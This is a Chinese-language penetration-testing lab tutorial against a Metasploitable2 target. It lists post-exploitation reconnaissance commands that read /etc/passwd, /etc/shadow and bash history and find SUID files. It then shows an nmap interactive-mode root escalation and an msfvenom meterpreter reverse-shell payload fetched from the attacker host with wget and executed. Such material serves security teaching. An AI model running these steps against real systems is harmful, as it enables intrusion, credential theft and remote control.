## **linux信息搜集**

### 1\. linux信息搜集

id 查看当前用户的权限和所在的管理组

[![wps21\[1\]](https://image.3001.net/images/20201116/1605506843.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110817172-1335775362.jpg)

python -c "import pty;pty.spawn('/bin/bash');" 会话提升

[![wps22\[1\]](https://image.3001.net/images/20201116/1605506844.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110817828-73663158.jpg)

uname -a 查看linux版本内核信息

[![wps23\[1\]](https://image.3001.net/images/20200701/1593550745.png!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110818541-91549196.jpg)

cat /etc/*release 查看linux发行信息

[![wps24\[1\]](https://image.3001.net/images/20201116/1605506845.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110819158-2007340839.jpg)

dpkg -l 查看安装的包

[![wps25\[1\]](https://image.3001.net/images/20200701/1593550745.png!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110819979-1268825730.jpg)

crontab -l 是否有计划任务（这边显示没有计划任务）

[![wps26\[1\]](https://image.3001.net/images/20201116/1605506846.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110820734-710081426.jpg)

/sbin/ifconfig -a 查看ip地址等

[![wps27\[1\]](https://image.3001.net/images/20200701/1593550745.png!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110821408-200269782.jpg)

cat /etc/passwd 普通用户可以查看用户的信息

[![wps28\[1\]](https://image.3001.net/images/20201116/1605506847.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110822409-957394492.jpg)

cat /etc/shadow 账号密码信息（root权限）（这边显示没有权限）

[![wps29\[1\]](https://image.3001.net/images/20200701/1593550745.png!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110823255-3298940.jpg)

[![wps30\[1\]](https://image.3001.net/images/20201116/1605506848.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110824018-754306182.jpg)

cat /root/.mysql_history 查看mysql历史操作（靶机和kali都未对mysql进行过操作所以没有这个文件）

[![wps31\[1\]](https://image.3001.net/images/20200701/1593550745.png!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110824710-845959664.jpg)

cat /root/.bash_history 查看用户指令历史记录

[![wps32\[1\]](https://image.3001.net/images/20201116/1605506849.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110825422-1939812172.jpg)

cat /proc/version 查看内核信息

[![wps33\[1\]](https://image.3001.net/images/20200701/1593550745.png!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110826106-586625106.jpg)

find / -perm -u=s -type f 2>/dev/null 匹配高权限的文件，看是否有利用点

/：代表查询位置，当前设置为根目录

-perm：代表权限

-u=s：代表用户的权限 s：superbin

-type：类型 ，f代表文件 file

### 2\. nmap漏洞复现

[![wps34\[1\]](https://image.3001.net/images/20201116/1605506850.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110826637-849061204.jpg)

nmap --interactive -->!sh 利用nmap3.5<4.6.4之间存在的漏洞进行提权  
  
---  
  
  

### 3\. msf linux模块反弹shell

先在kali上生成木马

[![wps35\[1\]](https://image.3001.net/images/20200701/1593550745.png!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110827398-457708129.jpg)

msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp
lhost=192.168.227.129 lport=4444 -f elf -o xx.elf linux的x86 payload需要跟上x86  
  
---  
  
  

首先先然metasploit2下载kali上的木马文件

[![wps36\[1\]](https://image.3001.net/images/20201116/1605506850.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110828063-611406991.jpg)

wget
[http://1192.168.227.129:80/xx.elf](http://1192.168.227.129/xx.elf)linux从命令行下载网页文件  
  
---  
  
  

然后将文件赋予能执行的权利（这里为了方便直接给了4777）

[![wps37\[1\]](https://image.3001.net/images/20201116/1605506851.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110828802-218029131.jpg)

chmod 4777 xx.elf 修改文件权限  
  
---  
  
  

因为是linux系统所以在设置监听的payload的时候需要也是linux

[![wps38\[1\]](https://image.3001.net/images/20201116/1605506852.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110829565-496365013.jpg)

linux执行xx.elf文件

[![wps39\[1\]](https://image.3001.net/images/20200701/1593550745.png!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110830109-1806122535.jpg)

成功进入到meterpreter界面

[![wps40\[1\]](https://image.3001.net/images/20201116/1605506852.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110830719-116244787.jpg)

[![wps41\[1\]](https://image.3001.net/images/20201116/1605506853.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110831343-1044590067.jpg)

